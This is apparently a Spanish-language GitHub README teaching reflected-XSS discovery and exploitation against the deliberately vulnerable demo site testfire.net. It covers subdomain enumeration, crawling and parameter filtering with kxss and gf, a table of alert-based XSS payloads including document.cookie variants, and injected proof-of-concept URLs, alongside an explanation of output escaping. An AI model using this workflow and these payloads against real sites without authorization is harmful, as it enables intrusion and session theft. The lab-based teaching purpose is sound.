# Reflected XSS Framework

![Anatomía de un ataque XSS](https://websitesecuritystore.com/wp-content/uploads/2021/07/cross-site-scripting-examples.svg)

>*Imagen tomada de: [Website Security Store](https://websitesecuritystore.com)*

Este repositorio contiene un marco de trabajo básico para la detección y explotación ética de vulnerabilidades de tipo **XSS reflejado**.

---

## ⚠️ Disclaimer

> Este proyecto es **exclusivamente para fines educativos** y de **pruebas en entornos controlados**.  
> No está permitido su uso en sistemas sin la debida autorización.  
> **Demo utilizada:** [http://testfire.net](http://testfire.net) con credenciales `admin:admin`  
> Esta aplicación está diseñada intencionalmente para tener fallas de seguridad.  
> *“This web application is purposely designed to have security vulnerabilities for educational and testing purposes.”*

---
<!-- espacio -->
## 1. Agregar HTTP Headers personalizados en Burp Suite

```bash
# En Burp -> Proxy -> match/replace rule
# Añadir:
Type: Request header
Match: ^User-Agent.*$
Replace: X-Pentest: Kxss_PoC 
Comment: (empty)
```
```bash
#Auto-modified request
POST /update HTTP/2
Host: example.com
Content-Type: application/json
X-Pentest: Kxss_PoC 
Content-Length: 34

{
  "key1": "value1",
  "key2": "value2"
}
```
>*Referencias: [Requestly](https://requestly.com/blog/modify-headers-in-https-requests-and-responses-in-chrome-firefox-safari/) [Exploit-notes](https://exploit-notes.hdks.org/exploit/web/tool/add-custom-http-headers-in-burp-suite/) [Website for testing header](https://httpbin.org/headers)*

<!-- espacio -->
## 2. Encontrar subdomains
```bash
subfinder -d testfire.net -silent -all -recursive -o testfire.net_subs.txt
amass enum -passive -d testfire.net -o testfire.net_amass_subs.txt
url -s "https://crt.sh/?q=%25.testfire.net&output=json" | jq -r '.[] | .name_value' | sed 's/\*\.//g' | anew testfire.net_crt.txt
github-subdomains -d testfire.net -t [github_token] -o testfire.net_github_subs.txt
cat *_subs.txt | sort -u | anew testfire.net_all_subs.txt
```
```bash
# Obtener token github
#Fine-grained personal access tokens -> Generate new token
```
>*Referencias: [Generate Token](https://github.com/settings/personal-access-tokens/)*

<!-- espacio -->
## 3. Web Crawling para encontrar URLs interesantes
```bash
#Simple command
katana -u testfire.net -silent -jc -o testfire.net_katana_results.txt
```
> Bash práctico para muchos subdomains
```bash
nano run_katana.sh
chmod +x run_katana.sh
./run_katana.sh
```
<details>
<summary>📜 Ver script Bash completo</summary>

```bash
#!/bin/bash

INPUT="testfire.net_all_subs.txt"
OUTPUT="testfire.net_katana_results.txt"

# Limpiar salida anterior
> "$OUTPUT"

# Filtrar subdominios válidos y ejecutar katana
grep -oP '(?:[a-zA-Z0-9_-]+\.)+testfire\.net' "$INPUT" | sort -u | while read -r sub; do
    echo "[+] Escaneando: http://$sub"
    katana -u "http://$sub" -silent -jc >> "$OUTPUT"
done

echo "[+] Finalizado. Resultados en $OUTPUT"
```
</details>

<!-- espacio -->
## 4. Buscar patrones comunes de XSS en URLs
```bash
nano filtrar_parameters_xss.sh
chmod +x filtrar_parameters_xss.sh
./filtrar_parameters_xss.sh
```
<details>
<summary>📜 Ver script Bash completo</summary>

```bash
#!/bin/bash

# Archivo de entrada
INPUT_FILE="testfire.net_katana_results.txt"

# Archivo de salida
OUTPUT_FILE="parametros_xss.txt"

# Lista de parámetros sospechosos
PARAMS=(
"q"
"s"
"search"
"lang"
"keyword"
"query"
"page"
"keywords"
"year"
"view"
"email"
"type"
"name"
"p"
"callback"
"jsonp"
"api_key"
"api"
"password"
"emailto"
"token"
"username"
"csrf_token"
"unsubscribe_token"
"id"
"item"
"page_id"
"month"
"immagine"
"list_type"
"url"
"terms"
"categoryid"
"key"
"l"
"begindate"
"enddate"
)

# Crear expresión regular separada por |
REGEX=$(IFS=\| ; echo "${PARAMS[*]}")

# Filtrar y guardar en archivo de salida
grep -Ei "\b(${REGEX})\b" "$INPUT_FILE" > "$OUTPUT_FILE"

echo "[+] Resultados guardados en $OUTPUT_FILE"
```
</details>

>*Referencias: [Patrones xss](https://github.com/1ndianl33t/Gf-Patterns/blob/master/xss.json)*

<!-- espacio -->
## 5. Investigación de candidatos
```bash
#cat parametros_xss.txt
https://demo.testfire.net/search.jsp
...
https://demo.testfire.net/swagger/err/error-transformers/transformers/not-of-type.js
https://demo.testfire.net/swagger/download-url.js
```

<details>
<summary>📜 Top payloads para testing</summary>

| Nº  | Payload                                             | Descripción                                                                 |
|-----|-----------------------------------------------------|------------------------------------------------------------------------------|
| 1  | `<script>alert(1)</script>`                         | Funciona cuando se inserta en HTML sin sanitizar.                  |
| 2  | `"><script>alert(1)</script>`                       | Cierra un atributo HTML antes de inyectar el script.                        |
| 3  | `<img src=x onerror=alert(1)>`                      | Ejecuta código JavaScript al fallar la carga de la imagen.                  |
| 4  | `<svg onload=alert(1)>`                             | SVG permite eventos como `onload`, útil para bypass en filtros simples.     |
| 5  | `<iframe src="javascript:alert(1)">`                | Ejecuta código desde el atributo `src`, usando el protocolo `javascript:`.  |
| 6  | `<body onload=alert(1)>`                            | Si se puede controlar etiquetas HTML, permite ejecutar al cargar el body.   |
| 7  | `<math><mtext><script>alert(1)</script>`           | Usa etiquetas poco comunes que a veces no son filtradas por WAFs.           |
| 8  | `<script>confirm(1)</script>`                       | Alternativa a `alert()`, puede evadir detecciones básicas.                  |
| 9  | `<details open ontoggle=alert(1)>`                  | HTML5: evento `ontoggle` poco filtrado, efectivo en bypass.                 |
| 10   | `<a href="javascript:alert(1)">Click</a>`           | Si el tag `<a>` es permitido, ejecuta JS al hacer clic.                     |

| Nº  | Payload                                                              | Descripción                                                                 |
|-----|----------------------------------------------------------------------|------------------------------------------------------------------------------|
| 1️  | `<script>alert(document.cookie)</script>`                            | Muestra las cookies activas de la sesión.                                   |
| 2  | `<script>alert(document.domain)</script>`                            | Muestra el dominio actual de ejecución.                                     |
| 3  | `<script>alert(document.location)</script>`                          | Imprime la URL completa del documento.                                      |
| 4  | `<script>alert(document.referrer)</script>`                          | Muestra desde qué página se llegó al sitio.                                 |
| 5  | `<script>alert("Cookie: "+document.cookie)</script>`                | PoC más personalizada mostrando la cookie.                                  |
| 6  | `<script>alert("URL: "+window.location.href)</script>`              | Muestra la URL completa con más claridad.                                   |
| 7  | `<script>alert("Dominio: "+location.hostname)</script>`             | Útil para fingerprint o confirmar subdominios.                              |
| 8  | `<script>alert("Ruta: "+location.pathname)</script>`                | Ruta del recurso dentro del sitio.                                          |
| 9  | `<script>alert("User-Agent: "+navigator.userAgent)</script>`        | Muestra el navegador/vista del cliente.                                     |
| 10   | `<script>alert("Cookie: "+document.cookie+"\nRef: "+document.referrer)</script>` | Combina datos clave en un solo pop-up.                            |

</details>

```bash
# Payload básico para la PoC:
<script>alert(document.cookie)</script>
#Url
https://demo.testfire.net/search.jsp?query=investor
https://demo.testfire.net/search.jsp?query=<script>alert(document.cookie)</script>
```
> Abrimos la ulr

![image](https://github.com/user-attachments/assets/8158af39-7bb6-478d-b70d-30124c771260)
> Testeamos el parámetro reflejado

![image](https://github.com/user-attachments/assets/7752fc90-2800-4a75-8ec9-ee26f52c385d)
> Insertamos el payload

![image](https://github.com/user-attachments/assets/1136a0b4-5fc0-4a46-a3b4-f1703687c70d)



>*Referencias: [Payload xss comunes](https://github.com/payloadbox/xss-payload-list)*

<!-- espacio -->
## 6. ¿Qué está pasando background?
> El servidor inserta directamente lo que escribimos en query en su HTML

```bash
<td valign="top" colspan="3" class="bb">
 <div class="fl" style="width: 99%;">
  <h1>Search Results</h1>
	<p>No results were found for the query:<br /><br />
	<script>alert(document.location)</script>
 </div>    
</td>	
```
> El navegador no ve eso como texto, sino como un verdadero elemento <script>, y por eso lo ejecuta inmediatamente.
> Para evitar este ataque, debería escapar los caracteres especiales como <, >, " y ' en el parámetro query.
> De esta forma, el navegador lo mostraría como texto, no lo ejecutaría.

```bash
<p>No results were found for the query:<br /><br />
&lt;script&gt;alert(document.location)&lt;/script&gt;
```

<!-- espacio -->
## 7. Automatizar Busqueda Reflected XSS
> Nos apoyamos de la tools gf para encontrar parametros comunes con posibles xss reflect
```bash
go install github.com/tomnomnom/gf@latest
#clonar patrones
mkdir -p ~/.gf
git clone https://github.com/1ndianl33t/Gf-Patterns
cp Gf-Patterns/*.json ~/.gf
```
<details>
<summary>📜 xss.json</summary>

```bash
$  cat ~/.gf/xss.json
{
     "flags": "-iE", 
     "patterns": [
"q=",
"s=",
"search=",
"lang=",
"keyword=",
"query=",
"page=",
"keywords=",
"year=",
"view=",
"email=",
"type=",
"name=",
"p=",
"callback=",
"jsonp=",
"api_key=",
"api=",
"password=",
"email=",
"emailto=",
"token=",
"username=",
"csrf_token=",
"unsubscribe_token=",
"id=",
"item=",
"page_id=",
"month=",
"immagine=",
"list_type=",
"url=",
"terms=",
"categoryid=",
"key=",
"l=",
"begindate=",
"enddate="

]
}
```
</details>

> Filtrar el fichero que contiene las url katana que contengan patrones xss

```bash
cat testfire.net_katana_results.txt | gf xss

https://demo.testfire.net/survey_questions.jsp?step=a
https://demo.testfire.net/util/serverStatusCheckService.jsp?HostName=
https://demo.testfire.net/disclaimer.htm?url=http://www.microsoft.com
https://demo.testfire.net/disclaimer.htm?url=http://www.netscape.com 
```
> Filtrar el fichero que contiene las url katana que contengan patrones xss
```bash
#payload:
<script>alert(document.cookie)</script>
https://demo.testfire.net/util/serverStatusCheckService.jsp?HostName=
https://demo.testfire.net/util/serverStatusCheckService.jsp?HostName=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```
![image](https://github.com/user-attachments/assets/0c5a3d6a-883c-4322-825a-73bc2747f7f3)

<!-- espacio -->
> Kxss
>> Kxss parametros previos filtrados

```bash
cat demo.testfire.net_katana_results.txt 
https://demo.testfire.net
...
https://demo.testfire.net/survey_questions.jsp?step=a
```
```bash
cat demo.testfire.net_katana_results.txt | grep = | kxss > kxss_test.txt  
```
```bash
cat kxss_test.txt  
URL: https://demo.testfire.net/index.jsp?content=business_retirement.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; 
...
URL: https://demo.testfire.net/index.jsp?content=inside_press.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
URL: https://demo.testfire.net/index.jsp?content=business_cards.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
URL: https://demo.testfire.net/index.jsp?content=inside_careers.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
```

<!-- espacio -->
>> Kxss usando urlfinder (10/10)
```bash
urlfinder -d demo.testfire.net | grep = | kxss > kxss_demo.txt
```
```bash
urlfinder -d demo.testfire.net | grep = | kxss > kxss_demo.txt
```
```bash
nano kxss_scan.sh
chmod +x kxss_scan.sh
./kxss_scan.sh
```
<details>
<summary>📜 Ver script Bash completo</summary>

```bash
#!/bin/bash

# Archivo con subdominios
SUBDOMAINS_FILE="testfire.net_all_subs.txt"
# Carpeta de salida
OUTPUT_DIR="kxss_results"
# Crear carpeta si no existe
mkdir -p "$OUTPUT_DIR"

# Iterar sobre cada subdominio
while read -r sub; do
    echo "[*] Escaneando: $sub"
    
    # Normalizar nombre para el fichero de salida
    OUT_FILE="${OUTPUT_DIR}/${sub//./_}.txt"
    
    # Ejecutar pipeline
    urlfinder -d "$sub" | grep = | kxss > "$OUT_FILE"
    
    echo "[+] Resultados guardados en: $OUT_FILE"
done < "$SUBDOMAINS_FILE"

echo "[✔] Escaneo finalizado. Revisa la carpeta: $OUTPUT_DIR"
```
</details>

![image](https://github.com/user-attachments/assets/0c5a3d6a-883c-4322-825a-73bc2747f7f3)
![image](https://github.com/user-attachments/assets/fc70261a-1db1-4879-828a-50a5806e9cec)

```bash
└─$ cat altoro_testfire_net.txt  
URL: http://altoro.testfire.net/index.jsp?content=inside_jobs.htm&job=LoyaltyMarketingProgramManager:Marketing Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
...
URL: http://altoro.testfire.net/index.jsp?content=inside_jobs.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
URL: http://altoro.testfire.net/index.jsp?content=personal_loans.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
```


<!-- espacio -->
<!-- espacio -->
## Creditos y Recursos
>*Referencias: [PortSwigger](https://portswigger.net/web-security/cross-site-scripting)*
>>*Referencias: [TryHackme](https://tryhackme.com/room/axss)*
>>>*Referencias: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)*
>>>>*Referencias: [AmrSec](https://www.youtube.com/watch?v=bAHNM8IInwE&ab_channel=AmrSec)*
>>>>>*Referencias: [Javo y LemonOfTroy](https://www.youtube.com/watch?v=EUWEdaNvxSM&ab_channel=ThreatXSecurity)*

